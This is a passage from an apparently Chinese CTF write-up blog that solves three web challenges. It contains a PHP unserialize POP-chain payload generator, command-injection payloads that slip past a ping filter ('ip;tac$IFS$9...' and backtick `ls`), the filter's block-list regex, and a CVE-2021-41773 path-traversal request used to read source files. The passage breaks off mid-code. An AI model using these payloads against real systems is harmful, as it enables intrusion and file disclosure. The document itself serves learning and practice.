class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;admin;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;passwd;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nono&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w22m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w33m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w22m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;w00m-&gt;&#123;<span class="variable language_">$this</span>-&gt;w22m&#125;();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$w00m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;w00m&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$w00m</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>构造:<br>写的时候vscode的编辑器会给出各个地方的数据类型 挺好用的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">w44m</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$admin</span> = <span class="string">&#x27;w44m&#x27;</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$passwd</span> = <span class="string">&#x27;08067&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;admin === <span class="string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;passwd ===<span class="string">&#x27;08067&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;admin;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;passwd;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;nono&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">w22m</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;w00m;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">w33m</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$w22m</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;w00m-&gt;&#123;<span class="variable language_">$this</span>-&gt;w22m&#125;(); <span class="comment">//动态执行</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;0&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">        通过w22m的__destruct来触发echo 将$this-&gt;w00m设置为w33m的一个实例对象</span></span><br><span class="line"><span class="comment">        这样就会触发w33m的__toString</span></span><br><span class="line"><span class="comment">        最终我是需要调用w44m里面的Getflag方法</span></span><br><span class="line"><span class="comment">        但它w44m里面的private和protected不知道会不会搞事情 urlencode一下应该不会少吧</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="variable">$w44m</span> = <span class="keyword">new</span> <span class="title function_ invoke__">w44m</span>();</span><br><span class="line">    <span class="variable">$w33m</span> = <span class="keyword">new</span> <span class="title function_ invoke__">w33m</span>();</span><br><span class="line">    <span class="variable">$w22m</span> = <span class="keyword">new</span> <span class="title function_ invoke__">w22m</span>();</span><br><span class="line">    <span class="comment">//POC</span></span><br><span class="line">    <span class="variable">$w33m</span>-&gt;w00m = <span class="variable">$w44m</span>;</span><br><span class="line">    <span class="variable">$w33m</span>-&gt;w22m = <span class="string">&quot;Getflag&quot;</span>;</span><br><span class="line">    <span class="variable">$w22m</span>-&gt;w00m = <span class="variable">$w33m</span>;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$w22m</span>)));</span><br><span class="line">    <span class="comment">// GET IT!</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="GXYCTF-2019-Ping-Ping-Ping"><a href="#GXYCTF-2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF 2019]Ping Ping Ping"></a>[GXYCTF 2019]Ping Ping Ping</h1><p>进去是一个ping界面 提示是RCE<br>尝试system(“ls”) 发现symbol会被过滤<br>盲测一手发现括号 空格 不行<br>结合Linux命令执行方式<br>我们 ping 127.0.0.1;ls<br>在执行完ping后是可以继续执行ls的<br>查看到当前目录有 index.php flag.php<br>直接cat$IFS$9flag.php 发现flag被过滤了<br>其实可以读取index.php来看waf的<br>这里直接用变量拼接<br>但是如果 b&#x3D;fl;e&#x3D;ag;… 还是会被识别出<br>想的绕过方法是调换顺序拼接一下 就能过了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bjut.edu.cn;e=ag;b=fl;tac$IFS$<span class="number">9</span>$b<span class="variable">$e</span>.php</span><br></pre></td></tr></table></figure><p>得到flag后再看看index.php的过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>))&#123;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$match</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="variable">$ip</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$match</span>);</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;fxck your symbol!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ /&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/bash/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="variable">$ip</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;ping -c 4 &quot;</span>.<span class="variable">$ip</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>印证了猜想: 顺序的f..l..a..g都不行 所以调换顺序就能绕过</p><p>后来看讨论区还学到一种方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bjut.edu.cn;tac$IFS$<span class="number">9</span>`ls`</span><br></pre></td></tr></table></figure><p>确实这种也可以 利用Linux反引号的特性(命令执行&#x2F;变量名可执行)</p><h1 id="GFCTF-2021-Baby-Web"><a href="#GFCTF-2021-Baby-Web" class="headerlink" title="[GFCTF 2021]Baby_Web"></a>[GFCTF 2021]Baby_Web</h1><p>学习文章:</p><ol><li><a href="https://blog.csdn.net/Jayjay___/article/details/131716989?spm=1001.2014.3001.5501" target="_blank">+</a></li></ol><p>初始源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;Welcome To GFCTF <span class="number">12</span>th!!&lt;/h1&gt;</span><br><span class="line">&lt;!--源码藏在上层目录xxx.php.txt里面，但你怎么才能看到它呢?--&gt;</span><br></pre></td></tr></table></figure><p>这里普通路径穿越打不穿 用到的是CVE-2021-41773<br>用bp传</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/cgi-bin/.%<span class="number">2</span>e/.%<span class="number">2</span>e/.%<span class="number">2</span>e/.%<span class="number">2</span>e/.%<span class="number">2</span>e/.%<span class="number">2</span>e/.%<span class="number">2</span>e/<span class="keyword">var</span>/www/index.php.txt</span><br></pre></td></tr></table></figure><p>得到:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;main&quot;</span>,<span class="string">&quot;main&quot;</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;Class.php&quot;</span>;</span><br><span class="line"><span class="variable">$temp</span> = <span class="keyword">new</span> <span class="title class_">Temp</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="variable">$temp</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>尝试读取Class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/cgi-bin/.%<span class="number">2</span>e/.%<span class="number">2</span>e/.%<span class="number">2</span>e/.%<span class="number">2</span>e/.%<span class="number">2</span>e/.%<span class="number">2</span>e/.%<span class="number">2</span>e/<span class="keyword">var</span>/www/Class.php.txt</span><br></pre></td></tr></table></figure><p>得到:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">defined</span>(<span class="string">&#x27;main&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;no!!&quot;</span>);</span><br><span class="line">Class Temp&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$date</span>=[<span class="string">&#x27;version&#x27;</span>=&gt;<span class="string">&#x27;1.0&#x27;</span>,<span class="string">&#x27;img&#x27;</span>=&gt;<span class="string">&#x27;https://www.apache.org/img/asf-estd-1999-logo.jpg&#x27;</span>];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$template</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;date = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;date,<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getTempName</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$dir</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dir</span> === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;template = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;..&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;./template/admin/&#x27;</span>.<span class="variable">$template</span>);</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">is_file</span>(<span class="variable">$this</span>-&gt;template))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;no!!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;template = <span class="string">&#x27;./template/index.html&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$space</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">extract</span>(<span class="variable">$this</span>-&gt;date);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getTempName</span>(<span class="variable">$template</span>,<span class="variable">$space</span>);</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable language_">$this</span>-&gt;template);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">listdata</span>(<span class="params"><span class="variable">$_params</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$system</span> = [</span><br><span class="line">            <span class="string">&#x27;db&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;app&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;num&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;sum&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;form&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;page&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;site&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;flag&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;not_flag&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;show_flag&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;more&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;catid&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;field&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;order&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;space&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;table&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;table_site&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;total&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;join&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;on&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;action&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;return&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;sbpage&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;module&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;urlrule&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;pagesize&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;pagefile&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$param</span> = <span class="variable">$where</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$_params</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_params</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$params</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27; &#x27;</span>, <span class="variable">$_params</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$params</span>[<span class="number">0</span>], [<span class="string">&#x27;list&#x27;</span>,<span class="string">&#x27;function&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$params</span>[<span class="number">0</span>] = <span class="string">&#x27;action=&#x27;</span>.<span class="variable">$params</span>[<span class="number">0</span>];  </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$params</span> <span class="keyword">as</span> <span class="variable">$t</span>) &#123;</span><br><span class="line">            <span class="variable">$var</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$t</span>, <span class="number">0</span>, <span class="title function_ invoke__">strpos</span>(<span class="variable">$t</span>, <span class="string">&#x27;=&#x27;</span>));</span><br><span class="line">            <span class="variable">$val</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$t</span>, <span class="title function_ invoke__">strpos</span>(<span class="variable">$t</span>, <span class="string">&#x27;=&#x27;</span>) + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$var</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$system</span>[<span class="variable">$var</span>])) &#123; </span><br><span class="line">                <span class="variable">$system</span>[<span class="variable">$var</span>] = <span class="variable">$val</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$param</span>[<span class="variable">$var</span>] = <span class="variable">$val</span>; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// action</span></span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$system</span>[<span class="string">&#x27;action&#x27;</span>]) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;function&#x27;</span>:</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="keyword">return</span>  <span class="string">&#x27;hacker!!&#x27;</span>;</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (!<span class="title function_ invoke__">function_exists</span>(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&#x27;hacker!!&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$force</span> = <span class="variable">$param</span>[<span class="string">&#x27;force&#x27;</span>];</span><br><span class="line">                <span class="keyword">if</span> (!<span class="variable">$force</span>) &#123;</span><br><span class="line">                    <span class="variable">$p</span> = [];</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="variable">$param</span> <span class="keyword">as</span> <span class="variable">$var</span> =&gt; <span class="variable">$t</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$var</span>, <span class="string">&#x27;param&#x27;</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">                            <span class="variable">$n</span> = <span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$var</span>, <span class="number">5</span>));</span><br><span class="line">                            <span class="variable">$p</span>[<span class="variable">$n</span>] = <span class="variable">$t</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$p</span>) &#123;</span><br><span class="line"></span><br><span class="line">                        <span class="variable">$rt</span> = <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>], <span class="variable">$p</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="variable">$rt</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="variable">$rt</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;list&#x27;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$this</span>-&gt;date);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来的代码审计有点多… 慢慢看</p><p>整体的关键是利用POST传入构造函数 调用extract来进行变量覆盖</p><p>关键一步在于访问题目给出的两个路由<br>.&#x2F;template&#x2F;admin&#x2F;   .&#x2F;template&#x2F;index.html<br>发现在第一个路由出现:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">listdata</span>(<span class="string">&quot;action=list module=<span class="subst">$mod</span>&quot;</span>);<span class="meta">?&gt;</span></span><br><span class="line">version:</span><br></pre></td></tr></table></figure><p>也就是说这个路由下是有listdata的<br>所以我们肯定要include这个路由<br>由于有个if_file的检查 所以我们要include &#x2F;template&#x2F;admin&#x2F;index.html<br>所以我们拼接在后面的值为 index.html<br>要想这么拼接就需要 $dir的值为admin<br>display函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$space</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ 